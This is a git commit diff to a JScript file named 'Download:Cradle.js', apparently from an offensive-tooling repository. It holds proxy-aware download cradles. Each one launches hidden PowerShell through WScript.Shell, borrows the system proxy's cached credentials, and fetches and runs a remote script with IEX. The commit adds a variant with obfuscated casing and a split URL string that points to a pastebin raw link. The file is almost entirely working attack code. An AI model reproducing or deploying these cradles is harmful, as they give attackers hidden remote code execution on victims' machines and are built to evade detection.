9edf547185e386d996adc1b1a0bf310d651a3057
VirtualAllocEx <50073731+VirtualAlllocEx@users.noreply.github.com>
2022-03-26 20:22:10 +0100

    Update Download:Cradle.js

--- Download:Cradle.js
+++ Download:Cradle.js
@@ -1,2 +1,7 @@
+#Info: Proxy Aware Download Cradle
 a=new ActiveXObject("wsCripT.sHell");
 a.run('PoWeRsHelL.eXe -NoP -w HidDen -c $a=neW-ObJeCt nET.wEbClieNt;$a.pROxy=[NeT.WeBreQueSt]::geTsyStEmweBprOxy();$a.prOxY.crEdEnTials=[NEt.crEdEnTiaLcaChe]::deFaUltcrEdeNtials;IeX $a.DOwNLOadstRiNg(\'https://server/payload.ps1\')', 0);
+
+#Info: Proxy Aware Download Cradle
+a=new ActiveXObject("wsCripT.sHell");
+a.run('PoWeRsHelL.eXe -NoP -w HidDen -c $a=neW-ObJeCt nET.wEbClieNt;$a.pROxy=[NeT.WeBreQueSt]::geTsyStEmweBprOxy();$a.prOxY.crEdEnTials=[NEt.crEdEnTiaLcaChe]::deFaUltcrEdeNtials;IeX $a.DOwNLOadstRiNg(\'ht\'+\'tps://pastebin.com/raw/Qpiz8y6c\')', 0);
